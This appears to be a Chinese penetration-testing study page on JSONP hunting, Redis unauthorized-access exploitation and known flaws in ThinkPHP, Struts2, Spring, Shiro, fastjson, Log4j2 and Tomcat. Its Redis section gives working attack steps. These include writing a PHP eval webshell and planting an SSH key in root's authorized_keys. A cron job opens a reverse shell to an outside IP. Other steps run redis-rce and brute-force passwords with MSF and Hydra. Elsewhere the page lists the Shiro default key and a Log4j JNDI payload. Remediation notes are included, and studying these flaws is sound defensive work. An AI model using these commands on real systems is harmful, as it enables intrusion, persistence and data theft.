<h2 id="JSONP漏洞挖掘思路"><a class="header-anchor" href="#JSONP漏洞挖掘思路">¶</a>JSONP漏洞挖掘思路</h2>
<p>Google Hack语法</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">inur<span class="hljs-variable">l:json</span> inur<span class="hljs-variable">l:callback</span>= site:<span class="hljs-keyword">a</span>.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:json</span><br></code></pre></td></tr></table></figure>
<p>Burp插件推荐</p>
<p><a target="_blank" rel="noopener" href="https://github.com/p1g3/JSONP-Hunter">https://github.com/p1g3/JSONP-Hunter</a></p>
<h2 id="防御方案"><a class="header-anchor" href="#防御方案">¶</a>防御方案</h2>
<ol>
<li>
<ol>
<li>
<ol>
<li>json 正确的 http 头输出尽量避免跨域的数据传输，对于同域的数据传输使用 xmlhttp 的方式作为数 据获取的方式，依赖于 javascript 在浏览器域里的安全性保护数据，如果是跨域的数据传输，必须要对敏 感的数据获取做权限认证；</li>
<li>严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等；</li>
<li>严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）；</li>
<li>严格过滤 callback 函数名及 JSON 里数据的输出；</li>
<li>严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。</li>
</ol>
</li>
<li></li>
</ol>
</li>
</ol>
<h1>redis漏洞利用</h1>
<blockquote>
<p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivota赞助。</p>
</blockquote>
<table>
<thead>
<tr>
<th><strong>漏洞利用方式</strong></th>
<th><strong>利用前提</strong></th>
<th><strong>备注</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>写公钥</td>
<td>root权限运行redis开放了ssh，允许公钥连接</td>
<td></td>
</tr>
<tr>
<td>反弹shell</td>
<td>root权限运行redis开启了计划任务</td>
<td></td>
</tr>
<tr>
<td>写入webshell</td>
<td>root权限运行redis知道网站根路径</td>
<td></td>
</tr>
<tr>
<td>主从复制</td>
<td>redis 4.x/5.x</td>
<td>无需root权限启动redis，获取的权限为启动用户的权限</td>
</tr>
</tbody>
</table>
<p>Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用redis自身的命令，进行写入文件操作，这样就会恶意攻击者利用redis未授权漏洞进行进一步攻击。</p>
<h2 id="漏洞利用-v3"><a class="header-anchor" href="#漏洞利用-v3">¶</a><strong>漏洞利用</strong></h2>
<h3 id="利用Redis漏洞写WebShell"><a class="header-anchor" href="#利用Redis漏洞写WebShell">¶</a>利用Redis漏洞写WebShell</h3>
<p><strong>利用前提</strong></p>
<ol>
<li>靶机redis链接未授权，在攻击机上能用<code>redis-cli</code>连上，并未登陆验证</li>
<li>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（开启web服务器，就可以利用url地址使用蚁剑进行连接）</li>
</ol>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">一、执行以下命令进行GetShell...</span><br><span class="language-xml">config get dir #查看redis数据库路径</span><br><span class="language-xml">config set dir /var/www/html  #修改靶机Redis数据库路径</span><br><span class="language-xml">config set dbfilename 1k.php #生成22.php文件</span><br><span class="language-xml">set xxx &quot;\r\n\r\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="language-xml">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span><br><span class="language-xml">set xxx &quot;\n\n\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ph9ar&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\n\n\n&quot;#上传木马可以通过蚁剑连接</span><br><span class="language-xml">save#保存</span><br><span class="language-xml">二、在浏览器访问该`1k.php`的后门文件....并链接验证</span><br></code></pre></td></tr></table></figure>
<h3 id="利用Redis漏洞SSH密钥链接"><a class="header-anchor" href="#利用Redis漏洞SSH密钥链接">¶</a>利用Redis漏洞SSH密钥链接</h3>
<p><strong>利用前提</strong></p>
<p>● Redis服务使用root账号启动<br>
● 成功连接redis<br>
● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。<br>
攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># 目标机配置</span><br>systemctl <span class="hljs-literal">start</span> ssh<br><br><span class="hljs-comment"># 攻击机产生公私钥</span><br>ssh-keygen -t rsa<br></code></pre></td></tr></table></figure>
<p>执行以下命令操作将公钥写入目标主机的认证文件中…</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 交互式操作</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /root/.ssh/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys# <span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n\n\n公钥\n\n\n&quot;</span>，将公钥写入x键。前后用\n换行，避免和Redis里其他缓存数据混合<br><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n\n\nssh-rsa 【私钥内容】\n\n\n&quot;</span><br>save<br><br><span class="hljs-comment"># 单条命令操作</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">type </span>key.txt | redis-cli.exe -h 192.168.43.141 -x <span class="hljs-built_in">set</span> xxx#如果是linux 将type换成cat<br><span class="hljs-comment">#将公钥作为value插入到数据库中，key随便啥值。</span><br>redis-cli.exe -h 192.168.116.129<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dir /root/.ssh<br><span class="hljs-comment">#修改redis数据库路径</span><br>redis-cli.exe -h 192.168.116.129<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys<br><span class="hljs-comment">#生成缓冲文件authorized_keys</span><br>redis-cli.exe -h 192.168.116.129 save<br><span class="hljs-comment">#保存</span><br>ssh -i id_rsa root@192.168.116.129<br><span class="hljs-comment">#连接</span><br></code></pre></td></tr></table></figure>
<p>进行SSH链接验证…</p>
<blockquote>
<ol>
<li>如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa root@192.168.43.141需要在.ssh目录下，因为权限问题。</li>
<li>.文件名必须是authorized_keys,由配置文件决定的。</li>
</ol>
</blockquote>
<h3 id="利用Crontab计划任务反弹Shell"><a class="header-anchor" href="#利用Crontab计划任务反弹Shell">¶</a>利用Crontab计划任务反弹Shell</h3>
<p><strong>漏洞原理</strong></p>
<p>​	在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。</p>
<p><strong>限制</strong></p>
<p>反弹shell这里只在<strong>centos</strong>中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。</p>
<p><strong>操作</strong></p>
<p>在Centos7系统的VPS上执行Redis的安装部署…并进行未授权访问！成功…</p>
<p>执行以下命令进行反弹Shell</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config <span class="hljs-built_in">set</span> dir /var/spool/cron/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename root<br><span class="hljs-built_in">set</span> xxx <span class="hljs-string">&quot;\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/101.42.118.221/8080 0&gt;&amp;1\n\n&quot;</span><br><span class="hljs-comment">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br>save<br></code></pre></td></tr></table></figure>
<h3 id="利用Redis主从复制反弹Shell"><a class="header-anchor" href="#利用Redis主从复制反弹Shell">¶</a>利用Redis主从复制反弹Shell</h3>
<blockquote>
<p><strong>Redis</strong>主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会&gt;影响数据完整性，且读写分开，减轻服务器压力。</p>
</blockquote>
<p><strong>原理</strong></p>
<p>​		Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">当<span class="hljs-literal">slave</span>向<span class="hljs-literal">master</span>发送PSYNC命令之后，一般会得到三种回复：<br><span class="hljs-number">1</span>. +FULLRESYNC：进行全量复制。<br><span class="hljs-number">2</span>. +CONTINUE：进行增量同步。<br><span class="hljs-number">3</span>. -ERR：当前<span class="hljs-literal">master</span>还不支持PSYNC。<br>进行全量复制是，会将<span class="hljs-literal">master</span>上的RDB文件同步到<span class="hljs-literal">slave</span>上。而进行增量复制时，<span class="hljs-literal">slave</span>向<span class="hljs-literal">master</span>要求数据同步，会发送<span class="hljs-literal">master</span>的runid和offest，如果runid和<span class="hljs-literal">slave</span>上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件。为了能让恶意so传输到目标服务器上，这里则必须采用全量复制。<br></code></pre></td></tr></table></figure>
<p><strong>限制</strong></p>
<p>利用redis主从复制redis版本要是4.x或者5.x</p>
<p><strong>操作</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">第一步：git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/n0b0dyCN/</span>RedisModules-ExecuteCommand.git<br>        <span class="hljs-comment">#下载RedisModules-ExecuteCommand</span><br>        <span class="hljs-comment"># 其他项目：https://github.com/vulhub/redis-rogue-getshell</span><br>第二步：git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Ridter/</span>redis-rce<br>        <span class="hljs-comment">#下载redis-rce</span><br>第三步：cd RedisModules-ExecuteCommand<br>第四步:make<br>        <span class="hljs-comment">#进入RedisModules-ExecuteCommand 使用make进行编译</span><br>第五步:mv module.so <span class="hljs-regexp">/root/</span>redis-rce<br>        <span class="hljs-comment">#编译之后将module.so移到redis-rce</span><br>第六步：cd <span class="hljs-regexp">/root/</span>redis-rce<br>第七步：python3 redis-rce.py -r <span class="hljs-number">192.168</span>.<span class="hljs-number">116.129</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">1.3</span> -f module.so  <br>        <span class="hljs-comment">#进入到redis-rce 执行命令，-r是目标IP -L是攻击机ip     </span><br></code></pre></td></tr></table></figure>
<blockquote>
<p>有可能执行失败原因是仅支持32位Redis程序利用</p>
</blockquote>
<h3 id="SSRF-Redis写入WebShell"><a class="header-anchor" href="#SSRF-Redis写入WebShell">¶</a>SSRF+Redis写入WebShell</h3>
<blockquote>
<p>当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击.</p>
</blockquote>
<p><strong>利用条件</strong></p>
<ul>
<li>知道网站根目录</li>
<li>根目录具有写文件的权限</li>
</ul>
<h3 id="利用MSF破解Redis密码"><a class="header-anchor" href="#利用MSF破解Redis密码">¶</a>利用MSF破解Redis密码</h3>
<p>调用相对应的MSF模块进行攻击操作</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss">msfconsole        <span class="hljs-meta">#开启msf</span><br>search redis      <span class="hljs-meta">#查看有关redis的模块</span><br><span class="hljs-keyword">use</span> <span class="hljs-number">5</span>             <span class="hljs-meta">#选择5号模块即：auxiliary/scanner/redis/redis_login</span><br><span class="hljs-keyword">show</span> options      <span class="hljs-meta">#展示需要设置的参数</span><br>set RHOST <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.3</span> <span class="hljs-meta">#设置靶机的ip</span><br><span class="hljs-keyword">run</span> <span class="hljs-meta">#运行模块</span><br></code></pre></td></tr></table></figure>
<h3 id="扩展…使用Hydra进行爆破"><a class="header-anchor" href="#扩展…使用Hydra进行爆破">¶</a>扩展…使用Hydra进行爆破</h3>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">hydra -P <span class="hljs-string">./pass.txt</span> redis:<span class="hljs-string">//192.168.229.140</span><span class="hljs-function">:6379</span> -f<br></code></pre></td></tr></table></figure>
<h3 id="修复参考"><a class="header-anchor" href="#修复参考">¶</a>修复参考</h3>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 修复一</span><br>禁止一些高危命令<br>修改 redis.conf 文件，添加<br><span class="hljs-keyword">rename</span>-command FLUSHALL “”<br><span class="hljs-keyword">rename</span>-command CONFIG “”<br><span class="hljs-keyword">rename</span>-command EVAL “”<br>来禁用远程修改 DB 文件地址<br><br><span class="hljs-comment"># 修复二</span><br>以低权限运行 Redis 服务<br>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br>$ groupadd -r redis &amp;&amp; useradd -r -g redis redis<br><br><span class="hljs-comment"># 修复三</span><br>为 Redis 添加密码验证<br>修改 redis.conf 文件，添加<br>requirepass mypassword<br><br><span class="hljs-comment"># 修复四</span><br>禁止外网访问 Redis<br>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br><span class="hljs-keyword">bind</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><br><span class="hljs-comment"># 修复五</span><br>保证 authorized_keys 文件的安全<br>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br>$ <span class="hljs-keyword">chmod</span> <span class="hljs-number">400</span> ~<span class="hljs-regexp">/.ssh/au</span>thorized_keys<br>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：<br><span class="hljs-comment"># chattr +i ~/.ssh/authorized_keys</span><br>然而，用户还可以重命名 ~<span class="hljs-regexp">/.ssh，然后新建新的 ~/</span>.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：<br><span class="hljs-comment"># chattr +i ~/.ssh</span><br>注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。<br></code></pre></td></tr></table></figure>
<h1>常见框架漏洞</h1>
<h2 id="Thinkphp"><a class="header-anchor" href="#Thinkphp">¶</a>Thinkphp</h2>
<p>TP5 rce：</p>
<p>Thinkphp5 5.0.22/5.1.29</p>
<p>Thinkphp5 5.0.23 rce</p>
<p><strong>更多</strong><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a> <a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a></p>
<h3 id="问题："><a class="header-anchor" href="#问题：">¶</a>问题：</h3>
<p><strong>如果给你一个网站你如何识别是否使用了thinkphp框架？</strong></p>
<ol>
<li>
<p>使用指纹识别插件 Wappalyzer</p>
</li>
<li>
<p>通过构建报错的url , 根据报错信息判断</p>
</li>
<li>
<p>根据tp的默认icon 5.路由格式</p>
</li>
</ol>
<h2 id="Struts2"><a class="header-anchor" href="#Struts2">¶</a>Struts2</h2>
<blockquote>
<p>Struts 2 是一个基于MVC设计模式的web应用框架：</p>
<p><strong>MVC</strong>：模型(Model)、视图(View)、控制器(Controller)：</p>
<p>模型 — 属于软件设计模式的底层基础，主要负责数据维护。视图 — 这部分是负责向用户呈现全部或部分数据。</p>
<p>控制器 — 通过软件代码控制模型和视图之间的交互。</p>
</blockquote>
<h3 id="struts2-rce"><a class="header-anchor" href="#struts2-rce">¶</a>struts2 rce</h3>
<p><strong>S2-057远程执行代码漏洞原理</strong></p>
<p>S2-057漏洞产生于网站配置xml的时候，有一个namespace的值，该值并没有做详细的安全过滤导致可以写入到XML上，尤其url标签值也没有做通配符的过滤，导致可以执行远程代码，以及系统命令执行。</p>
<p>S2-057 先决条件 :</p>
<p>alwaysSelectFullNamespace 正确 - 操作元素未设置名称空间属性，或使用了通配符用户将从 uri 传递命名空间，并将其解析为 OGNL 表达式，最终导致远程代码执行漏洞</p>
<h1>spring</h1>
<p>未授权访问、远程命令执行</p>
<h3 id="SpEL是什么？"><a class="header-anchor" href="#SpEL是什么？">¶</a>SpEL是什么？</h3>
<p>SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。就使用方法上来看，一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。</p>
<h3 id="SpEL原理如下："><a class="header-anchor" href="#SpEL原理如下：">¶</a>SpEL原理如下：</h3>
<ol>
<li>
<ol>
<li>
<ol>
<li>表达式:可以认为就是传入的字符串内容；</li>
<li>解析器︰将字符串解析为表达式内容；</li>
<li>上下文:表达式对象执行的环境；</li>
<li>根对象和活动上下文对象∶根对象是默认的活动上下文对象，活动上下文对象表示了当前表达式操作的对象。</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="spring-rce"><a class="header-anchor" href="#spring-rce">¶</a>spring rce</h2>
<p>Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</p>
<p><strong>漏洞原理</strong></p>
<p>Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。 由于Spring Cloud Function中 RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码</p>
<p><strong>fofa:</strong></p>
<p>icon_hash=“116323821”</p>
<p><strong>spring的特征</strong></p>
<ol>
<li>icon 是个小树叶</li>
<li>默认报错页面</li>
</ol>
<p><strong>其他利用方式</strong></p>
<p><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/a60c8897b4bd0dbfe08cf7260">https://xie.infoq.cn/article/a60c8897b4bd0dbfe08cf7260</a> <a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/77266744d4eea813a20716fb5">https://xie.infoq.cn/article/77266744d4eea813a20716fb5</a> <a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
<h1>shiro</h1>
<h2 id="shiro-反序列化rce"><a class="header-anchor" href="#shiro-反序列化rce">¶</a>shiro 反序列化rce</h2>
<h3 id="Shiro-550-反序列化rce"><a class="header-anchor" href="#Shiro-550-反序列化rce">¶</a>Shiro-550 反序列化rce</h3>
<p>漏洞原理</p>
<p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的 cookie。</p>
<p>cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。</p>
<p>在服务端接收cookie值时，按照如下步骤来解析处理</p>
<p>1、检索RememberMe cookie 的值</p>
<p>2、Base64解码</p>
<p>3、使用AES解密(加密密钥硬编码)</p>
<p>4、进行反序列化操作（未作过滤处理）</p>
<p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p>
<p><strong>利用条件</strong></p>
<p>获得aes的加密密钥</p>
<p>在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为 kPH+bIxk5D2deZiIxcaaaA==，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞</p>
<p>尽管目前已经更新了许多版本，<strong>官方并没有对反序列化漏洞本身解决</strong>，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码， 这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。</p>
<blockquote>
<p>只要rememberMe的AES加密秘钥泄露，<strong>无论shiro是什么版本都会导致反序列化漏洞</strong>。</p>
</blockquote>
<p><strong>fofa：</strong></p>
<p>app=“Apache-Shiro” header=“rememberme=deleteMe” header=“shiroCookie”</p>
<h2 id="Shiro-721-反序列化漏洞"><a class="header-anchor" href="#Shiro-721-反序列化漏洞">¶</a>Shiro-721 反序列化漏洞</h2>
<p><strong>Shiro Padding Oracle Attack</strong></p>
<p><strong>漏洞原理</strong></p>
<p>由于Apache Shiro cookie中通过 AES-128-CBC模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
<p><strong>利用技巧</strong></p>
<p>1.该漏洞需要登录后获取到合法的Cookie: rememberMe=XXX后才可以进行利用, 看起来不是很好利用 但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥 所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性 ；<br>
2.如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 rememberMe。</p>
<p><strong>shiro550和721的区别</strong></p>
<p>​    721是需要知道已经登陆用户的合法cookie  550不用登录就可以直接跑key;</p>
<p>​	550先base64解码然后AES解密再反序列化； 721的加密方式是通过<code>AES-128-CBC</code>模式加密</p>
<p>后续待	补充……</p>
<h1>fastjson反序列化漏洞</h1>
<p><strong>原理</strong>：漏洞利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验<br>
证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过<br>
这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步<br>
对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响。</p>
<h1>Log4j2注入漏洞</h1>
<p>参考文档：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hilaryfrank/article/details/121944757?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-121944757.142%5Ev93%5EchatgptT3_2&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/hilaryfrank/article/details/121944757?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j2漏洞的原理&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-121944757.142^v93^chatgptT3_2&amp;spm=1018.2226.3001.4187</a></p>
<p>复现：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53747497/article/details/129906229?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-129906229.142%5Ev93%5Einsert_down28v1&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_53747497/article/details/129906229?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j漏洞复现&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-129906229.142^v93^insert_down28v1&amp;spm=1018.2226.3001.4187</a></p>
<p>Log4j2漏洞总的来说就是：因为Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</p>
<p><strong>漏洞适应版本</strong>：2.0 &lt;= Apache log4j2 &lt;=2.14.1</p>
<h3 id="什么是JNDI"><a class="header-anchor" href="#什么是JNDI">¶</a>什么是JNDI</h3>
<p>JNDI全称 Java Naming and Directory Interface。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。</p>
<p><strong>JDNI通过绑定的概念将对象和名称联系起来</strong>。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。</p>
<p>简单来说：通过JNDI提供了&quot;通过名称找到对应的对象&quot;的规范定义，即SPI功能，实现则由具体的技术支持，如：LDAP，RMI，DNS，Database。</p>
<h3 id="什么是LDAP"><a class="header-anchor" href="#什么是LDAP">¶</a>什么是LDAP</h3>
<p>目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。</p>
<p>LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。</p>
<p>目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</p>
<p>简单来说：LDAP是一个目录服务，可以通过目录路径查询到对应目录下的对象（文件）等。即其也是JNDI的实现，通过名称（目录路径）查询到对象（目录下的文件）。</p>
<h1>常见中间件漏洞</h1>
<h2 id="一、Tomcat"><a class="header-anchor" href="#一、Tomcat">¶</a>一、Tomcat</h2>
<blockquote>
<p>Fofa :</p>
<p>app=“tomcat”</p>
<p>server=“Apache Tomcat” &amp;&amp; body=“Apache Tomcat”</p>
</blockquote>
<h3 id="Tomcat介绍"><a class="header-anchor" href="#Tomcat介绍">¶</a>Tomcat介绍</h3>
<p>tomcat是一个开源而且免费的jsp服务器，默认端口 : 8080，属于轻量级应用服务器。它可以实现 JavaWeb程序的装载，是配置JSP（Java Server Page）和JAVA系统必备的一款环境。</p>
<h3 id="CVE-2017-12615"><a class="header-anchor" href="#CVE-2017-12615">¶</a>CVE-2017-12615</h3>
<p><strong>Tomcat put方法任意文件写入漏洞</strong></p>
<p>当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly初始化参数由默认值设置为false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p>
